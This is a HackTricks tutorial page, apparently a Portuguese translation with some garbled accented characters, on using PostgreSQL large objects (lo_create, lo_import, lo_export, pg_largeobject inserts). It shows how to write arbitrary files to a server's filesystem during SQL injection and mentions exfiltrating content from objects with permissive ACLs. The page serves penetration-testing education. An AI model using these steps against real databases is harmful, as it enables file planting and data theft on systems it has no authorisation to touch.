{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Objetos Grandes do PostgreSQL

O PostgreSQL oferece uma estrutura conhecida como **objetos grandes**, acess√≠vel atrav√©s da tabela `pg_largeobject`, projetada para armazenar tipos de dados grandes, como imagens ou documentos PDF. Essa abordagem √© vantajosa em rela√ß√£o √† fun√ß√£o `COPY TO`, pois permite a **exporta√ß√£o de dados de volta para o sistema de arquivos**, garantindo que uma r√©plica exata do arquivo original seja mantida.

Para **armazenar um arquivo completo** dentro desta tabela, um objeto deve ser criado na tabela `pg_largeobject` (identificado por um LOID), seguido pela inser√ß√£o de peda√ßos de dados, cada um com 2KB de tamanho, neste objeto. √â crucial que esses peda√ßos tenham exatamente 2KB de tamanho (com a poss√≠vel exce√ß√£o do √∫ltimo peda√ßo) para garantir que a fun√ß√£o de exporta√ß√£o funcione corretamente.

Para **dividir seus dados bin√°rios** em peda√ßos de 2KB, os seguintes comandos podem ser executados:
```bash
split -b 2048 your_file # Creates 2KB sized files
```
Para codificar cada arquivo em Base64 ou Hex, os comandos abaixo podem ser usados:
```bash
base64 -w 0 <Chunk_file> # Encodes in Base64 in one line
xxd -ps -c 99999999999 <Chunk_file> # Encodes in Hex in one line
```
**Importante**: Ao automatizar este processo, certifique-se de enviar peda√ßos de 2KB de bytes em texto claro. Arquivos codificados em hex precisar√£o de 4KB de dados por peda√ßo devido √† duplica√ß√£o no tamanho, enquanto arquivos codificados em Base64 seguem a f√≥rmula `ceil(n / 3) * 4`.

O conte√∫do dos grandes objetos pode ser visualizado para fins de depura√ß√£o usando:
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
#### Usando `lo_creat` e Base64

Para armazenar dados bin√°rios, um LOID √© primeiro criado:
```sql
SELECT lo_creat(-1);       -- Creates a new, empty large object
SELECT lo_create(173454);  -- Attempts to create a large object with a specific OID
```
Em situa√ß√µes que requerem controle preciso, como explorar uma Blind SQL Injection, `lo_create` √© preferido para especificar um LOID fixo.

Os blocos de dados podem ent√£o ser inseridos da seguinte forma:
```sql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 1, decode('<B64 chunk2>', 'base64'));

```
Para exportar e potencialmente excluir o objeto grande ap√≥s o uso:
```sql
SELECT lo_export(173454, '/tmp/your_file');
SELECT lo_unlink(173454);  -- Deletes the specified large object
```
#### Usando `lo_import` e Hex

A fun√ß√£o `lo_import` pode ser utilizada para criar e especificar um LOID para um objeto grande:
```sql
select lo_import('/path/to/file');
select lo_import('/path/to/file', 173454);
```
Ap√≥s a cria√ß√£o do objeto, os dados s√£o inseridos por p√°gina, garantindo que cada peda√ßo n√£o exceda 2KB:
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
```
Para completar o processo, os dados s√£o exportados e o objeto grande √© exclu√≠do:
```sql
select lo_export(173454, '/path/to/your_file');
select lo_unlink(173454);  -- Deletes the specified large object
```
### Limita√ß√µes

√â observado que **objetos grandes podem ter ACLs** (Listas de Controle de Acesso), potencialmente restringindo o acesso mesmo a objetos criados pelo seu usu√°rio. No entanto, objetos mais antigos com ACLs permissivas ainda podem ser acess√≠veis para exfiltra√ß√£o de conte√∫do.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
